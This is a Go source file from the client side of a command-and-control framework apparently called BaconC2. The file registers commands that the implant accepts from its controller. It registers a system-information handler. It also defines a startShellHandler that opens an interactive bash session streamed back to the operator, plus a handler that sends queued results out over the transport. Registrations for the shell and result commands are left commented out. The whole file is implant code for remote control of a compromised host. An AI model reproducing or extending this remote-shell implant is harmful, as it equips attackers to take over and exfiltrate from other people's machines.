package registry

import (
	"fmt"
	"log"
	"sync"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
	command_handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands"
	"github.com/RabbITCybErSeC/BaconC2/pkg/commands/system"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/formatter"
)

const (
	shellSessionTimeout = 30 * time.Second
)

type BuiltInCommand string

const (
	SysInfoCommand       BuiltInCommand = "sys_info"
	StartShellCommand    BuiltInCommand = "start_shell"
	ReturnResultsCommand BuiltInCommand = "return_results"
)

func RegisterBuiltInCommands(
	registry *command_handler.CommandHandlerRegistry,
	resultsQueue queue.IResultQueue,
	transport transport.ITransportProtocol,
	streamingTransport local_models.IStreamingTransport,
) {
	registry.RegisterHandler(*system.NewGetInfoCommandHandler())

}

// func RegisterBuiltInCommands(
// 	registry *command_handler.CommandHandlerRegistry,
// 	resultsQueue queue.IResultQueue,
// 	transport transport.ITransportProtocol,
// 	streamingTransport local_models.IStreamingTransport,
// ) {
// 	registry.RegisterHandler(command_handler.CommandHandler{
// 		Name: string(SysInfoCommand),
// 		Handler: func(cmd models.Command) models.CommandResult {
// 			return common.GetInfoHandler(cmd, resultsQueue)
// 		},
// 	})
// 	registry.RegisterHandler(command_handler.CommandHandler{
// 		Name: string(StartShellCommand),
// 		Handler: func(cmd models.Command) models.CommandResult {
// 			return startShellHandler(cmd, resultsQueue, streamingTransport)
// 		},
// 	})
// 	registry.RegisterHandler(command_handler.CommandHandler{
// 		Name: string(ReturnResultsCommand),
// 		Handler: func(cmd models.Command) models.CommandResult {
// 			return returnResultsHandler(cmd, transport)
// 		},
// 	})
// }

func startShellHandler(cmd models.Command, resultsQueue queue.IResultQueue, streamingTransport local_models.IStreamingTransport) models.CommandResult {
	config := local_models.NewStreamingConfig(local_models.ShellTypeBash, "xterm")

	resultChan := make(chan models.CommandResult, 1)
	var wg sync.WaitGroup
	wg.Add(1)

	go func() {
		defer wg.Done()
		if err := streamingTransport.StartStreamingSession("shell", config, resultChan); err != nil {
			resultChan <- models.CommandResult{
				ID:     cmd.ID,
				Status: "error",
				Output: formatter.ToJsonString(map[string]string{"error": fmt.Sprintf("Failed to start shell: %v", err)}),
			}
		}
	}()

	// Wait for result or timeout
	select {
	case result := <-resultChan:
		wg.Wait() // Ensure goroutine completes
		if result.Status == "success" {
			if err := resultsQueue.Add(result); err != nil {
				log.Printf("Failed to queue shell result for command ID %s: %v", cmd.ID, err)
				return models.CommandResult{
					ID:     cmd.ID,
					Status: "error",
					Output: formatter.ToJsonString(map[string]string{"error": fmt.Sprintf("Failed to queue result: %v", err)}),
				}
			}
		}
		return result
	case <-time.After(shellSessionTimeout):
		log.Printf("Shell session timed out for command ID: %s", cmd.ID)
		streamingTransport.CloseSession("shell")
		wg.Wait() // Ensure goroutine completes before returning
		return models.CommandResult{
			ID:     cmd.ID,
			Status: "error",
			Output: formatter.ToJsonString(map[string]string{"error": "Shell session timeout"}),
		}
	}
}

func returnResultsHandler(cmd models.Command, transport transport.ITransportProtocol) models.CommandResult {
	transport.SendResults()
	return models.CommandResult{}
}
